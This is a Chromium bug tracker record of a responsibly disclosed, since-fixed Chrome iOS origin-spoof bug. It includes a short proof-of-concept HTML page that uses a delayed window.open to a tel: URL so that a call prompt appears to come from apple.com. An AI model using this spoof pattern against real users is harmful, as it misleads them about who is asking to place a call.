# tel: URL scheme Reference Origin Spoof in Chrome iOS

| Field | Value |
|-------|-------|
| **Issue ID** | [40086220](https://issues.chromium.org/issues/40086220) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Unknown |
| **Platforms** | iOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | dd...@apple.com |
| **Created** | 2016-12-16 |
| **Bounty** | $500.00 |

## Description

Steps to reproduce the problem:
In the latest Chrome iOS browser, open the PoC.html, the source code is listed below:
<!DOCTYPE HTML>
<html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

</head>

<body>

<form action="https://www.apple.com" target="aa" method="get" onsubmit="setTimeout('p()',1200);">

<input type="submit">

</form>

<script>

function p() {

  var t = window.open('tel:10010','aa');

}

</script>

</body>

</html>

You will find, it seems like that the 'https://www.apple.com' is intended to call 10010

What is the expected behavior?
This problem could also be reproduced in Firefox iOS and Safari in iOS 10.2. So I also filed this issue to Mozilla. Firefox iOS developer thought it was a bug and filed it to Webkit project:
https://bugs.webkit.org/show_bug.cgi?id=165160

So I think that it is important to let you noticed.

What went wrong?
You could take a look at the PoC.png. You will find, it seems like that the 'https://www.apple.com' is intended to call 10010. This is another kind of spoof.

Did this work before? N/A 

Chrome version: 55.0.2883.79  Channel: stable
OS Version: 10.2
Flash Version: Shockwave Flash 21.9 r9

## Attachments

- [PoC.PNG](attachments/PoC.PNG) (image/png, 157.3 KB)

## Timeline

### el...@chromium.org (2016-12-16)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-12-19)

Thanks for the report. This behavior definitely doesn't seem ideal.

It does seem like an upstream WebKit bug, but it's still good to know about.

### pa...@chromium.org (2018-02-14)

+ddkilzer@apple.com FYI

### el...@chromium.org (2018-02-14)

[Empty comment from Monorail migration]

### dd...@apple.com (2018-02-15)

This was fixed by <https://bugs.webkit.org/show_bug.cgi?id=165160> via WebKit commit <https://trac.webkit.org/changeset/219013/webkit>.

There was a follow-up fix tracked by <https://bugs.webkit.org/show_bug.cgi?id=174170> that landed in WebKit commit <https://trac.webkit.org/changeset/219149/webkit>.

Both fixes shipped in iOS 11.0 GM.

I'm not sure how to properly close this bug, but I don't think there is any more to do here.


### el...@chromium.org (2018-02-27)

This does appear to be fixed in the latest iOS with Chrome Canary.

https://whytls.com/test/tel.html

### sh...@chromium.org (2018-02-28)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-03-13)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-03-13)

Thanks, $500 for this martinzhou96@. Also, how would you like to be credited in the Chrome release notes?

### aw...@google.com (2018-03-19)

[Empty comment from Monorail migration]

### ma...@gmail.com (2018-04-07)

Thanks! If possible, please acknowledge me as "Yuyang Zhou of Tencent Security Platform Department" in the release notes.

### sh...@chromium.org (2018-06-06)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2018-06-06)

This issue was migrated from crbug.com/chromium/674887?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/674888]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086220)*
